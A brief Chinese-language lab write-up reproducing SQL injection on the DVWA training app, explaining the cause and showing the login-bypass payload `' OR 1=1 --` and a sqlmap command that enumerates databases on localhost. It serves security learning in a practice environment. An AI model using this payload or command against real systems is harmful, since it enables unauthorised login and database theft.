# SQL注入
# SQL 注入漏洞复现

## 🌐 靶场环境
- DVWA (Security Level: Low)
- 数据库：MySQL
- 工具：Burp Suite + sqlmap

## 🔍 漏洞原理
用户输入的数据没有经过过滤，直接拼接到 SQL 语句中，导致注入。

## 🛠️ 复现过程
1. 输入 `' OR 1=1 --` 到用户名字段  
2. 成功登录管理员账号

## 🧰 自动化利用
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx" --dbs

## 📕 参考文献
https://portswigger.net/web-security/sql-injection